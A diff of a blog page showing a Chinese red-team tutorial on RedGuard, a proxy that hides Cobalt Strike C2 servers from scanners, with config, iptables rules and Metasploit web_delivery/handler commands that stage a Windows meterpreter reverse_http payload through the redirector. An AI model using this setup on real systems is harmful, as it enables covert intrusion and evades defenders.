@@ -15,18 +15,18 @@
 <meta property="og:site_name" content="Laohuan&#39;s Blog">
 <meta property="og:description" content="简介前几天发现自己的服务器被fofa和微步情报标记为了cobaltstrike服务器，由于以前使用的版本没有对相应的特征做修改，导致被空间搜索引擎标记，刚好看到风起在朋友圈发布了RedGuard，于是赶紧试试鲜。 RedGuard由风起大佬编写的一款c2前置流量控制工具，可以帮助红队更好的隐藏c2基础设施，且目前还在更新和完善之中，在写这篇文章之后又进行了2次更新，优化和增加了一些新功能。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-05-31_22-17-54.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-05-31_22-42-34.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-05-31_22-51-28.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-05-31_22-56-17.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-06-01_17-20-16.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2022-06-05_15-47-01.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2022-05-31_22-17-54.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2022-05-31_22-42-34.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2022-05-31_22-51-28.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2022-05-31_22-56-17.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2022-06-01_17-20-16.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2022-06-05_15-47-01.png">
 <meta property="article:published_time" content="2023-02-02T08:30:32.000Z">
-<meta property="article:modified_time" content="2023-02-02T08:44:29.625Z">
+<meta property="article:modified_time" content="2025-01-06T09:35:36.085Z">
 <meta property="article:author" content="Laohuan">
 <meta property="article:tag" content="工具分享">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.laohuan.art/Snipaste_2022-05-31_22-17-54.png">
+<meta name="twitter:image" content="http://qn.laohuan.xin/Snipaste_2022-05-31_22-17-54.png">
   
     <link rel="alternative" href="/atom.xml" title="Laohuan&#39;s Blog" type="application/atom+xml">
   
@@ -44,7 +44,7 @@
 
   
 
-<meta name="generator" content="Hexo 4.2.0"></head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body>
   <div id="container" q-class="show:isCtnShow">
@@ -274,31 +274,31 @@
 <p>RedGuard由风起大佬编写的一款c2前置流量控制工具，可以帮助红队更好的隐藏c2基础设施，且目前还在更新和完善之中，在写这篇文章之后又进行了2次更新，优化和增加了一些新功能。</p>
 <a id="more"></a>
 
-<p><a href="https://github.com/wikiZ/RedGuard/blob/main/doc/README_CN.md" target="_blank" rel="noopener">github地址</a></p>
+<p><a href="http://github.com/wikiZ/RedGuard/blob/main/doc/README_CN.md" target="_blank" rel="noopener">github地址</a></p>
 <h3><span id="使用">使用</span></h3><p>第一次运行会在用户目录生成<strong>.RedGuard_CobaltStrike.ini</strong>文件，编辑此文件对其进行配置，当然也支持参数进行热配置。</p>
-<p><img src="https://cdn.laohuan.art/Snipaste_2022-05-31_22-17-54.png" alt></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2022-05-31_22-17-54.png" alt></p>
 <p>重点关注proxy的3个配置</p>
 <ul>
 <li>Port_HTTPS</li>
 <li>port_HTTP</li>
 <li>HostTarget</li>
 </ul>
-<p>如上图，当前配置的意思是将Port_http的80端口绑定到本机127.0.0.1的8080端口，当有请求访问服务器的80端口，RedGuard会对请求特征做判断，当请求不符合规则(及host头不是360.net，这个可以随意设置)，请求会被重定向到<a href="https://360.net,否则请求会被转发到cs的监听端口8080端口。请求会不会被重定向取决于DROP参数，如DORP参数设置为true将直接丢弃请求包。" target="_blank" rel="noopener">https://360.net,否则请求会被转发到cs的监听端口8080端口。请求会不会被重定向取决于DROP参数，如DORP参数设置为true将直接丢弃请求包。</a></p>
-<p>同理,443端口被绑定到本机127.0.0.1的8443端口，当请求不符合规则时将请求重定向到<a href="https://360.net,当host头为360.com时将请求转发到cs的8443监听端口，主要取决于你cs的监听器是http还是https。" target="_blank" rel="noopener">https://360.net,当host头为360.com时将请求转发到cs的8443监听端口，主要取决于你cs的监听器是http还是https。</a></p>
-<p>更多设置，如过滤上线ip、上线时间、上线省份请参考作者官方文档<a href="https://github.com/wikiZ/RedGuard/blob/main/doc/README_CN.md" target="_blank" rel="noopener">RedGuard文档</a></p>
+<p>如上图，当前配置的意思是将Port_http的80端口绑定到本机127.0.0.1的8080端口，当有请求访问服务器的80端口，RedGuard会对请求特征做判断，当请求不符合规则(及host头不是360.net，这个可以随意设置)，请求会被重定向到<a href="http://360.net,否则请求会被转发到cs的监听端口8080端口。请求会不会被重定向取决于DROP参数，如DORP参数设置为true将直接丢弃请求包。" target="_blank" rel="noopener">http://360.net,否则请求会被转发到cs的监听端口8080端口。请求会不会被重定向取决于DROP参数，如DORP参数设置为true将直接丢弃请求包。</a></p>
+<p>同理,443端口被绑定到本机127.0.0.1的8443端口，当请求不符合规则时将请求重定向到<a href="http://360.net,当host头为360.com时将请求转发到cs的8443监听端口，主要取决于你cs的监听器是http还是http。" target="_blank" rel="noopener">http://360.net,当host头为360.com时将请求转发到cs的8443监听端口，主要取决于你cs的监听器是http还是http。</a></p>
+<p>更多设置，如过滤上线ip、上线时间、上线省份请参考作者官方文档<a href="http://github.com/wikiZ/RedGuard/blob/main/doc/README_CN.md" target="_blank" rel="noopener">RedGuard文档</a></p>
 <p>当然，这种场景适合将反代和cs服务器建在同一台机器上，比较节省资源，配合iptables可防止网络空间搜索引擎将你的服务器标记。</p>
 <h3><span id="cs">CS</span></h3><p>启动RedGuard <code>sudo ./RedGuard_64</code></p>
 <p>cs新建监听，c2端口设置为RedGaurd的反代端口，bind设置为cs的监听端口，注意host header可以随意设置，但一定要和配置文件里的一致。</p>
-<p><img src="https://cdn.laohuan.art/Snipaste_2022-05-31_22-42-34.png" alt></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2022-05-31_22-42-34.png" alt></p>
 <p>再配置IPtables，只允许127.0.0.1访问本机的8443端口</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 8443 -j DROP <span class="comment">#丢弃所有访问8443端口的包</span></span><br><span class="line">iptables -I INPUT -p tcp -s 127.0.0.1 --dport 8443 -j ACCEPT <span class="comment">#只允许127.0.0.1访问本机的8443端口</span></span><br></pre></td></tr></table></figure>
 
 <p>这样就可以正常上线了</p>
 <p>还有一种就是拿一台单独的服务器做反代服务器，另一台服务器做真正的cs服务器，只需简单修改配置文件即可</p>
-<p><img src="https://cdn.laohuan.art/Snipaste_2022-05-31_22-51-28.png" alt></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2022-05-31_22-51-28.png" alt></p>
 <p>这里将192.168.1.8用作反代服务器，192.168.1.7作为真正的cs服务器，HosTtarget填写cs服务器的地址192.168.1.7</p>
 <p>新建cs监听，填写相应端口。</p>
-<p><img src="https://cdn.laohuan.art/Snipaste_2022-05-31_22-56-17.png" alt></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2022-05-31_22-56-17.png" alt></p>
 <p>在cs服务器配置防火墙，只允许反向代理服务器来访问cs的监听端口</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 8443 -j DROP </span><br><span class="line">iptables -I INPUT -p tcp -s 192.168.1.8 --dport 8443 -j ACCEPT</span><br></pre></td></tr></table></figure>
 
@@ -312,7 +312,7 @@
 
 
 
-<p><img src="https://cdn.laohuan.art/Snipaste_2022-06-01_17-20-16.png" alt></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2022-06-01_17-20-16.png" alt></p>
 <p>在能执行命令的情况下，想方便点使用无文件落地的方式</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"><span class="built_in">set</span> target 2</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.1.8</span><br><span class="line"><span class="built_in">set</span> lport 80 <span class="comment">#端口设置为反向代理端口</span></span><br><span class="line"><span class="built_in">set</span> srvport 8082 <span class="comment">#用于下载stage</span></span><br><span class="line"><span class="built_in">set</span> httphostheader 360.net</span><br><span class="line"><span class="built_in">set</span> OverrideLhOST 192.168.1.8</span><br><span class="line"><span class="built_in">set</span> overrideLpoRT 80</span><br><span class="line"><span class="built_in">set</span> overriderequesthost <span class="literal">true</span></span><br><span class="line"><span class="built_in">set</span> DisablePayloadHandler <span class="literal">true</span> <span class="comment">#关闭监听</span></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler </span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> lhost 127.0.0.1</span><br><span class="line"><span class="built_in">set</span> lport 8080</span><br><span class="line"><span class="built_in">set</span> httphostheader 360.net</span><br><span class="line"><span class="built_in">set</span> OverrideLhOST 192.168.1.8</span><br><span class="line"><span class="built_in">set</span> overrideLpoRT 80</span><br><span class="line"><span class="built_in">set</span> overriderequesthost <span class="literal">true</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
@@ -321,7 +321,7 @@
 
 
 
-<p><img src="https://cdn.laohuan.art/Snipaste_2022-06-05_15-47-01.png" alt></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2022-06-05_15-47-01.png" alt></p>
 
       
 
@@ -523,7 +523,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2023 Laohuan
+    		&copy; 2025 Laohuan
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -643,6 +643,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">JBoss</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CGI</a>
               </li>
              
@@ -651,7 +655,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">JBoss</a>
+                <a href="javascript:void(0)" class="js-tag color1">HTTPS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">应急响应</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">考试</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -659,7 +671,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">权限维持</a>
+                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -671,7 +683,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Samba</a>
+                <a href="javascript:void(0)" class="js-tag color5">权限维持</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -679,7 +691,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Tomcat</a>
+                <a href="javascript:void(0)" class="js-tag color1">Samba</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -687,7 +699,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Tomcat</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">Weblogic</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">工具分享</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -703,6 +723,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">靶场</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">zabbix</a>
               </li>
              
@@ -711,39 +735,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Chrome</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">靶场</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">应急响应</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">工具分享</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">考试</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">HTTPS</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">加解密</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Chrome</a>
               </li>
             
             <div class="clearfix"></div>
